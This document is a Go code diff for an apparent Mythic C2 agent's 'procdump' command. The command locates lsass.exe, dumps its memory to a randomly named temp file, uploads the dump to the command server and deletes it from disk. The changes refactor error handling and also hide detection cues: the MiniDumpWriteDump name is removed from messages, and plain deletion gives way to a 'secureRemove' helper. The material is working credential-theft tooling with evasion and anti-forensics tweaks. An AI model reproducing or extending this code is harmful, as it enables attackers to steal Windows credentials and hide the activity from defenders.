@@ -35,7 +35,7 @@ func (c *ProcdumpCommand) Name() string {
 }
 
 func (c *ProcdumpCommand) Description() string {
-	return "Dump process memory using MiniDumpWriteDump (requires SeDebugPrivilege for protected processes)"
+	return "Dump process memory (requires SeDebugPrivilege for protected processes)"
 }
 
 type procdumpArgs struct {
@@ -47,11 +47,7 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	var args procdumpArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Failed to parse parameters: %v", err)
 		}
 	}
 
@@ -71,21 +67,13 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	case "lsass":
 		pid, name, err := findProcessByName("lsass.exe")
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Failed to find lsass.exe: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Failed to find lsass.exe: %v", err)
 		}
 		targetPID = pid
 		processName = name
 	case "dump":
 		if args.PID <= 0 {
-			return structs.CommandResult{
-				Output:    "Error: -pid is required for dump action",
-				Status:    "error",
-				Completed: true,
-			}
+			return errorResult("Error: -pid is required for dump action")
 		}
 		targetPID = uint32(args.PID)
 		name, _ := getProcessName(targetPID)
@@ -95,11 +83,7 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 			processName = name
 		}
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Available: lsass, dump", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s. Available: lsass, dump", args.Action)
 	}
 
 	// Open target process
@@ -119,22 +103,14 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 		} else {
 			errMsg += "\nEnsure you have admin privileges and SeDebugPrivilege."
 		}
-		return structs.CommandResult{
-			Output:    errMsg,
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(errMsg)
 	}
 	defer windows.CloseHandle(hProcess)
 
 	// Create temp file for the dump — use os.CreateTemp for random naming (no distinctive pattern)
 	dumpFile, err := os.CreateTemp("", "")
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to create dump file: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to create dump file: %v", err)
 	}
 	dumpPath := dumpFile.Name()
 
@@ -154,23 +130,15 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	dumpFile.Close()
 
 	if ret == 0 {
-		os.Remove(dumpPath)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("MiniDumpWriteDump failed for PID %d (%s): %v", targetPID, processName, callErr),
-			Status:    "error",
-			Completed: true,
-		}
+		secureRemove(dumpPath)
+		return errorf("memory dump failed for PID %d (%s): %v", targetPID, processName, callErr)
 	}
 
 	// Get dump file info
 	fi, err := os.Stat(dumpPath)
 	if err != nil {
-		os.Remove(dumpPath)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to stat dump file: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		secureRemove(dumpPath)
+		return errorf("Failed to stat dump file: %v", err)
 	}
 
 	dumpSize := fi.Size()
@@ -178,12 +146,8 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	// Open the dump file for transfer
 	file, err := os.Open(dumpPath)
 	if err != nil {
-		os.Remove(dumpPath)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to open dump file for transfer: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		secureRemove(dumpPath)
+		return errorf("Failed to open dump file for transfer: %v", err)
 	}
 
 	// Upload via Mythic file transfer
@@ -203,21 +167,13 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 		select {
 		case <-downloadMsg.FinishedTransfer:
 			file.Close()
-			os.Remove(dumpPath)
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Successfully dumped %s (PID %d)\nDump size: %s\nFile uploaded to Mythic and cleaned from disk.", processName, targetPID, formatDumpSize(dumpSize)),
-				Status:    "success",
-				Completed: true,
-			}
+			secureRemove(dumpPath)
+			return successf("Successfully dumped %s (PID %d)\nDump size: %s\nFile uploaded to server and cleaned from disk.", processName, targetPID, formatFileSize(dumpSize))
 		case <-time.After(1 * time.Second):
 			if task.DidStop() {
 				file.Close()
-				os.Remove(dumpPath)
-				return structs.CommandResult{
-					Output:    "Dump upload cancelled",
-					Status:    "error",
-					Completed: true,
-				}
+				secureRemove(dumpPath)
+				return errorResult("Dump upload cancelled")
 			}
 		}
 	}
@@ -314,21 +270,3 @@ func enableThreadDebugPrivilege() error {
 	return windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
 }
 
-// formatDumpSize formats bytes into human-readable size
-func formatDumpSize(bytes int64) string {
-	const (
-		KB = 1024
-		MB = 1024 * KB
-		GB = 1024 * MB
-	)
-	switch {
-	case bytes >= GB:
-		return fmt.Sprintf("%.1f GB", float64(bytes)/float64(GB))
-	case bytes >= MB:
-		return fmt.Sprintf("%.1f MB", float64(bytes)/float64(MB))
-	case bytes >= KB:
-		return fmt.Sprintf("%.1f KB", float64(bytes)/float64(KB))
-	default:
-		return fmt.Sprintf("%d bytes", bytes)
-	}
-}
